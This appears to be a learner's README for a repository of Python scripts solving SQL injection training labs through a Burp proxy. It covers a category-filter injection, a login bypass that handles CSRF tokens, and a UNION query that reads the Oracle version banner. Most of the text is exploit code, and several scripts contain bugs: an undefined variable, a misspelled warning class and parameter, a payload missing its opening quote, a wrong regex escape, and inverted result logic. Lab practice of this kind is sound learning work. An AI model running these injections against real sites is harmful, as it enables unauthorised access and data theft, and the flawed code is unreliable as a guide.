# SQL Injection Labs Repository

This repository contains Python scripts for various SQL injection labs I am working on while learning SQL injection techniques using Burp Suite. Each lab has its own script, and this README will be updated as I progress through the labs.

# Labs Overview

## Lab 1: Basic SQL Injection

- **Description**: This lab demonstrates a basic SQL injection attack by exploiting a vulnerable URL parameter.
- **Script**: `sql_injection1.py`
- **Status**: Completed

```bash

python3 script.py <url> <payload>

import requests
import sys 
import urllib

proxies={'http':"http://127.0.0.1:8080",'https':"https://127.0.0.1:8080"}

def exploit_sql(url,payload):
    uri="/filter?category="
    r=requests.get(url+uri+payload,verify=False,proxies=proxies)
    if "cat grin" in r.text:
        return True
    else:
        return False

if __name__ == "__main__":
    try:
        url=sys.argv[1].strip() 
        payload=sys.argv[2].strip()
    except IndexError:
        print("usage is not correct ")
    if exploit_sql(url,payload):
        print(" the sql injection is complete")
    else:
        print("there is error in the sql injection") 
```

## Lab 2: SQL Injection with CSRF Token

- **Description**: This lab demonstrates SQL injection while handling CSRF tokens. It retrieves the CSRF token from the webpage and uses it to attempt a login with an SQL payload.
- **Script**: `sql_injection2.py`
- **Status**: Completed

```bash

python3 python3 labX_script.py <url> <sql_payload>

import sys
import requests
import urllib3
from bs4 import BeautifulSoup 
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies= {"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}

def get_csrf_token(s,url):
    res = s.get(url,verify=False,proxies=proxies)
    soup = BeautifulSoup(res.text,'html.parser')
    csrf=soup.find("input")["value"]
    return csrf

def exploit_sqli(s,url,payload):
    csrf=get_csrf_token(s,url)
    data={"csrf":csrf,"username":payload,"password":"12345678"}
    r=s.post(url,data=data,verify=False,proxies=proxies)
    ras=r.text
    if "log out" in ras:
        return True
    else:
        return False


if __name__== "__main__":
    try:
        url=sys.argv[1].strip()
        sqli_payload=sys.argv[2].strip()
    except IndexError:
        print("use the below bash command on your terminal")
        print("use python3 file.py <url> <sql payload>")
    s=requests.Session()
    if exploit_sqli(s,url,payload):
        print("the sql injetion is successful we have logged in")
    else:
        print("the sql injection is not successful we are not logged in")

```


#### Requirements

- pip install requests beautifulsoup4 urllib3

## Lab 3: SQL Injection with UNION TO IDENTIFY DATA BASE VERSION

- **Description**: This lab demonstrates SQL injection attack against a vulnerable web application to retrieve the version of the Oracle database USING SQL UNION operator.
- **Script**: `sql_injection3.py`
- **Status**: Completed
- **note**: 

    - To use UNION, you must know the number of columns because:
        1. The number and order of the columns must be the same in all queries.
        2. The data types must be compatible.
    - The database is Oracle. In Oracle, after the SELECT statement, the FROM clause must follow when you try to identify the number of columns.

```bash
import sys
import urllib3
import requests
from bs4 import BeautifulSoup
import re

urllib3.disable_warnings(urllib3.exceptions.INsecureRequestWarning)

proxies={"http":"http://127.0.0.1:8080","https":"https://127.0.0.1:8080"}

def exploit_sqli_version(url):
    path="/filter?catagory=Gifts"
    sql_payload= "UNION select banner,NULL from v$version--"
    r=requests.get(url+path+sql_payload,verify=False,proxies=proxies)
    res=r.text
    if "oracle database" in res:
        print("the sql injection is succesfull")
        soup=BeautifulSoup(r.text,"html.parser")
        version=soup.find(text=re.compile('^.oracle/sDatabase'))
        print(f"the oracle data base version is {version}")


if __name__=="__main__":
    try:
        url=sys.argv[1].strip()
    except: 
        print("input the url")
        sys.exit()
    if exploit_sqli_version(url):
        print("unable to dump the databsse")
```

# Disclaimer

- These scripts are intended for educational purposes only. Use them responsibly and only on applications you own or have explicit permission to test.